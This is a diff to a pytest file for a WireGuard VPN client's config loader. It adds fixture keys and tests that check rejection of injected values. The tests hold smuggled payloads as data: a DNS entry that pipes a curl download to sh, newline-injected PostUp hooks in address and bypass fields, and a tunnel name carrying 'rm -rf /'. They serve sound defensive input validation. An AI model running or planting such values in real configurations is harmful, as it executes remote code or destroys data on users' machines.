@@ -30,8 +30,8 @@ VALID = {
     "wireguard": {
         "tunnel_name": "OutWarp",
         "client_address": "10.0.0.42/32",
-        "client_private_key": "dGVzdGtleQ==",
-        "server_public_key": "c2VydmVya2V5",
+        "client_private_key": "xif9YhWWYeCAt6e0GjpNuu9W1952Cagg/0weOOzPL6c=",
+        "server_public_key": "RFUpPmm7W7VHTyjKsHdpR5DV/QICx9UXub9dIMAYZsE=",
         "dns": ["1.1.1.1"],
     },
     "routing": {"bypass_ips": ["203.0.113.42"]},
@@ -88,13 +88,16 @@ def test_preshared_key_defaults_empty(tmp_path):
     assert cfg.wireguard.preshared_key == ""
 
 
+PSK = "rY2vuEB4VDipfXtL8xlnizgU9eBsI2tQfKw7L4xLFIw="
+
+
 def test_preshared_key_parsed_and_roundtrips(tmp_path):
-    data = {**VALID, "wireguard": {**VALID["wireguard"], "preshared_key": "cHNrMDAw"}}
+    data = {**VALID, "wireguard": {**VALID["wireguard"], "preshared_key": PSK}}
     cfg = ClientConfig.load(write_cfg(tmp_path, data))
-    assert cfg.wireguard.preshared_key == "cHNrMDAw"
+    assert cfg.wireguard.preshared_key == PSK
     out = tmp_path / "rt.owcfg"
     cfg.save(out)
-    assert json.loads(out.read_text())["wireguard"]["preshared_key"] == "cHNrMDAw"
+    assert json.loads(out.read_text())["wireguard"]["preshared_key"] == PSK
 
 
 def test_expiry_parsed_from_meta(tmp_path):
@@ -225,6 +228,54 @@ def test_mtu_defaults_and_validates(tmp_path):
     assert cfg.wireguard.mtu == 1380
     data = {**VALID, "wireguard": {**VALID["wireguard"], "mtu": 9000}}
     with pytest.raises(ConfigError, match="mtu"):
+        ClientConfig.load(write_cfg(tmp_path, data))
+
+
+# --- FIX-01: a .owcfg is hostile input; nothing destined for a wg-quick
+# .conf line may reach it unvalidated. ---
+
+def test_rejects_dns_with_shell_injection(tmp_path):
+    data = {
+        **VALID,
+        "wireguard": {**VALID["wireguard"], "dns": ["1.1.1.1; curl http://x/y.sh|sh"]},
+    }
+    with pytest.raises(ConfigError, match="dns"):
+        ClientConfig.load(write_cfg(tmp_path, data))
+
+
+def test_rejects_client_address_with_conf_injection(tmp_path):
+    data = {
+        **VALID,
+        "wireguard": {
+            **VALID["wireguard"],
+            "client_address": "10.0.0.2/32\nPostUp = touch /tmp/pwned",
+        },
+    }
+    with pytest.raises(ConfigError, match="client_address"):
+        ClientConfig.load(write_cfg(tmp_path, data))
+
+
+def test_rejects_malformed_wg_keys(tmp_path):
+    data = {
+        **VALID,
+        "wireguard": {**VALID["wireguard"], "server_public_key": "not-a-real-key"},
+    }
+    with pytest.raises(ConfigError, match="server_public_key"):
+        ClientConfig.load(write_cfg(tmp_path, data))
+
+
+def test_rejects_tunnel_name_with_bad_chars(tmp_path):
+    data = {
+        **VALID,
+        "wireguard": {**VALID["wireguard"], "tunnel_name": "Out Warp; rm -rf /"},
+    }
+    with pytest.raises(ConfigError, match="tunnel_name"):
+        ClientConfig.load(write_cfg(tmp_path, data))
+
+
+def test_rejects_bypass_ips_with_injection(tmp_path):
+    data = {**VALID, "routing": {"bypass_ips": ["10.0.0.1\nPostUp = touch /tmp/pwned"]}}
+    with pytest.raises(ConfigError, match="bypass_ips"):
         ClientConfig.load(write_cfg(tmp_path, data))
 
 
